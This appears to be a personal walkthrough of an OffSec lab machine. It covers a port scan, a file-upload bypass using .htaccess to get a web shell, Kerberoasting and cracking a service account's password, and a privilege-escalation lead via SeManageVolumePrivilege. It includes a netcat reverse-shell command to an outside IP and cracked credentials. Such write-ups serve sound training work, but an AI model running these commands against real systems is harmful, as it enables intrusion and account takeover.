```ls
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Access The Event
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-24 09:42:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| tls-alpn: 
|_  http/1.1
|_http-title: Access The Event
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:     a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1:   b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_SHA-256: 0169 7338 0c0f 1df0 0bd9 593e d8d5 efa3 706c d6df 7993 f614 1272 b805 22ac dd23
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49787/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: -9s
| smb2-time: 
|   date: 2025-12-24T09:43:54
|_  start_date: N/A

```


![[Pasted image 20251224111233.png]]

![[Pasted image 20251224104518.png]]


we can upload files in the buy ticket and check them out in the `uploads.php`

`.phpt` is allowed i tried uploading several rev shell nothiung worked apparently the html is executing but php not 

adding a custom extension using the `.htaccess` works  
![[Pasted image 20251224114335.png]]

we got a shell 
![[Pasted image 20251224114250.png]]


we dropped a sharphound but we dont have any outbound but i found a kerborastable account 

![[Pasted image 20251227170011.png]]


lets check for some priv sec

![[Pasted image 20251224121228.png]]


some pass while exploring 

![[Pasted image 20251224124604.png]]

more passwords 

![[Pasted image 20251227163952.png]]
more pass 

![[Pasted image 20251227164156.png]]

no Luck 

i installed powerview module  and lets try to crack kerboarast ticket 


checking for spn
```
PS C:\Users\svc_apache\Downloads> get-DomainUser -SPN


logoncount                    : 0
badpasswordtime               : 12/31/1600 4:00:00 PM
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=access,DC=offsec
objectclass                   : {top, person, organizationalPerson, user}
name                          : krbtgt
primarygroupid                : 513
objectsid                     : S-1-5-21-537427935-490066102-1511301751-502
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
showinadvancedviewonly        : True
accountexpires                : NEVER
cn                            : krbtgt
whenchanged                   : 5/21/2022 12:13:57 PM
instancetype                  : 4
objectguid                    : 43869731-9eb5-4539-a98d-4543c98814d9
lastlogon                     : 12/31/1600 4:00:00 PM
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
dscorepropagationdata         : {5/21/2022 12:13:57 PM, 4/8/2022 9:12:58 AM, 1/1/1601 12:04:16 AM}
serviceprincipalname          : kadmin/changepw
memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=access,DC=offsec
whencreated                   : 4/8/2022 9:12:57 AM
iscriticalsystemobject        : True
badpwdcount                   : 0
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
usncreated                    : 12324
countrycode                   : 0
pwdlastset                    : 4/8/2022 2:12:57 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 48002

company                       : Access
logoncount                    : 1
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=MSSQL,CN=Users,DC=access,DC=offsec
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 4/8/2022 2:40:02 AM
name                          : MSSQL
objectsid                     : S-1-5-21-537427935-490066102-1511301751-1104
samaccountname                : svc_mssql
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 7/6/2022 5:23:18 PM
instancetype                  : 4
usncreated                    : 16414
objectguid                    : 05153e48-7b4b-4182-a6fe-22b6ff95c1a9
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : MSSQLSvc/DC.access.offsec
givenname                     : MSSQL
lastlogon                     : 4/8/2022 2:40:02 AM
badpwdcount                   : 0
cn                            : MSSQL
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                   : 4/8/2022 9:39:43 AM
primarygroupid                : 513
pwdlastset                    : 5/21/2022 5:33:45 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 73754



```


requesting a ticket 

```
PS C:\Users\svc_apache\Downloads> get-DomainSPNTicket -SPN "MSSQLSvc/DC.access.offsec"


SamAccountName       : UNKNOWN
DistinguishedName    : UNKNOWN
ServicePrincipalName : MSSQLSvc/DC.access.offsec
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$MSSQLSvc/DC.access.offsec*$E3FB77318368B3DBAE13C94583C4DEB7$45F543A....
```


crackcing the ticket with hashcat


```
hashcat hashes.kerberoasts /usr/share/wordlists/rockyou.txt 

--> trustno1
```


- tried runas to switch users didnt work so i searched for runas binary and i found this Invoke-RunasCs.ps1 which is basically an improved version of runas 

- wrote nc on public User since it seams that accessing apache was not readable from mssql 
```powershell
 Invoke-RunasCs svc_mssql trustno1 "C:\Users\Public\nc.exe  192.168.45.237 1338 -e cmd.exe "
```

-  we noticed that in mssql user has SeManageVolumePrivilege 
- we check online for some exploits and we found this

https://github.com/CsEnox/SeManageVolumeExploit

i had some errors compiling the c file  since  It is a **Visual Studio–specific precompiled header file**. GCC does not use `pch.h`

so download and install vs  and compile it there after that inject it as mentioned in the path and we are good !!

or use this
![[Pasted image 20251228162631.png]]